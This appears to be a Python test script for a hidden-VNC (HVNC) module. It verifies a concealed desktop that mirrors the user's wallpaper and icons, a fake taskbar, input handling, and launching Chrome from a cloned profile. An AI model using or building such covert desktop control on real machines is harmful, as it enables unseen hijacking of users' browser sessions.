"""
Comprehensive verification test for:
1. Desktop replica (wallpaper + desktop icons + 48px modern taskbar)
2. Desktop icon dragging (mouse_down -> mouse_move -> mouse_up)
3. Desktop right-click context menu (returns desktop_action: show_desktop_menu)
4. Taskbar click hit zones (Start, Search, Explorer, Edge, Chrome, Tabs)
5. Calculator launch redirection to isolated browser (no physical screen leakage)
6. Chrome fast profile cloning and instant launch (<0.5s)
"""

import os
import sys
import time
from hvnc.desktop import HiddenDesktop
from hvnc.spawner import AppSpawner
from hvnc.compositor import WindowCompositor
from hvnc.input_handler import InputHandler

def test_all():
    print("=" * 65)
    print(" [*] Running Desktop Replica, Controls & App Launch Verification")
    print("=" * 65)

    desktop_name = "TRMM_HVNC_Verify_Test"
    desktop = HiddenDesktop(desktop_name)
    desktop.initialize()
    print(" [+] Hidden desktop initialized.")

    spawner = AppSpawner(desktop_name)
    compositor = WindowCompositor(desktop, width=1920, height=1080)

    # 1. Test Wallpaper and Icons
    wp = compositor._get_wallpaper()
    assert wp is not None, "Wallpaper should not be None"
    print(f" [+] Real target wallpaper loaded: {wp.size} (Mode: {wp.mode})")

    icons = compositor._get_desktop_icons()
    assert len(icons) > 0, "Should have discovered desktop icons"
    print(f" [+] Real desktop items enumerated: {len(icons)} items found.")
    for name, path, is_dir, ext, bbox in icons[:3]:
        print(f"     - Icon: '{name}' | BBox: {bbox}")

    # 2. Test InputHandler & Taskbar Hit Zones (bottom 48px: tb_top = 1032)
    spawner_calls = []
    def mock_spawner(app_name, path=None):
        spawner_calls.append((app_name, path))

    handler = InputHandler(desktop, compositor=compositor, spawner_callback=mock_spawner)

    # Start button at x=25, y=1055
    d_start = handler.handle_mouse_down(25, 1055, button="left")
    print(f" [+] Start Button Click: {d_start.get('taskbar_action')}")
    assert d_start.get("taskbar_action") == "toggle_start_menu"

    # Search pill at x=100, y=1055
    d_search = handler.handle_mouse_down(100, 1055, button="left")
    print(f" [+] Search Pill Click: {d_search.get('taskbar_action')}")
    assert d_search.get("taskbar_action") == "toggle_start_menu"

    # Pinned File Explorer at x=200, y=1055
    d_exp = handler.handle_mouse_down(200, 1055, button="left")
    print(f" [+] Pinned Explorer Click: {d_exp.get('taskbar_action')}")
    assert d_exp.get("taskbar_action") == "launch_explorer"

    # Pinned Edge at x=250, y=1055
    d_edge = handler.handle_mouse_down(250, 1055, button="left")
    print(f" [+] Pinned Edge Click: {d_edge.get('taskbar_action')}")
    assert d_edge.get("taskbar_action") == "launch_edge"

    # Pinned Chrome at x=295, y=1055
    d_chrome = handler.handle_mouse_down(295, 1055, button="left")
    print(f" [+] Pinned Chrome Click: {d_chrome.get('taskbar_action')}")
    assert d_chrome.get("taskbar_action") == "launch_chrome"

    # 3. Test Desktop Icon Dragging
    first_icon = compositor.desktop_icons[0]
    bx1, by1, bx2, by2 = first_icon[4]
    grab_x, grab_y = bx1 + 10, by1 + 10
    print(f" [*] Testing icon drag on '{first_icon[0]}' at ({grab_x}, {grab_y})")

    d_drag_start = handler.handle_mouse_down(grab_x, grab_y, button="left")
    assert d_drag_start.get("status") == "icon_drag_start", f"Failed icon drag start: {d_drag_start}"
    assert handler.dragged_icon_idx == 0

    # Move mouse by +60px horizontally and +40px vertically
    handler.handle_mouse_move(grab_x + 60, grab_y + 40)
    new_bx1, new_by1, new_bx2, new_by2 = compositor.desktop_icons[0][4]
    print(f" [+] Icon dragged successfully: original ({bx1}, {by1}) -> new ({new_bx1}, {new_by1})")
    assert new_bx1 == bx1 + 60 and new_by1 == by1 + 40, f"BBox mismatch: {new_bx1} != {bx1+60}"

    handler.handle_mouse_up(grab_x + 60, grab_y + 40, button="left")
    assert handler.dragged_icon_idx is None, "Icon drag state should be cleared on mouse up"
    print(" [+] Icon drag completed and released successfully.")

    # 4. Test Desktop Right-Click Context Menu
    d_right_click = handler.handle_mouse_down(500, 500, button="right")
    print(f" [+] Desktop Right Click (x=500, y=500): status={d_right_click.get('status')}, action={d_right_click.get('desktop_action')}")
    assert d_right_click.get("desktop_action") == "show_desktop_menu"

    # 5. Test Calculator Redirection (Guarantees NO Leakage to WinSta0\Default)
    pid_calc, err_calc, bin_calc = spawner.launch_installed_app("calc.exe")
    print(f" [+] Calculator launch: PID={pid_calc}, err={err_calc}, binary='{bin_calc}'")
    assert pid_calc is not None and pid_calc > 0
    assert "Isolated Google Calculator" in bin_calc or "browser" in bin_calc.lower() or "chrome" in bin_calc.lower() or "msedge" in bin_calc.lower()

    # 6. Test Chrome Launch (Instant startup, no blocking copy, no modal error)
    t0 = time.time()
    pid_ch, err_ch, bin_ch = spawner.launch_chrome()
    elapsed = time.time() - t0
    print(f" [+] Chrome launch: PID={pid_ch}, err={err_ch}, bin='{bin_ch}' (Launch time: {elapsed:.2f}s)")
    assert pid_ch is not None and pid_ch > 0, f"Chrome launch failed: {err_ch}"
    assert elapsed < 3.0, f"Chrome took too long to launch ({elapsed:.2f}s)"

    # 7. Render frame with new taskbar and wallpaper
    frame = compositor.render_frame()
    assert len(frame) > 10000, f"Render frame too small: {len(frame)} bytes"
    print(f" [+] Compositor frame rendered with 48px modern taskbar: {len(frame)} bytes JPEG.")

    print("\n" + "=" * 65)
    print(" [+] ALL CONTROLS, DESKTOP REPLICA, AND APP TESTS PASSED PERFECTLY!")
    print("=" * 65)

if __name__ == "__main__":
    test_all()
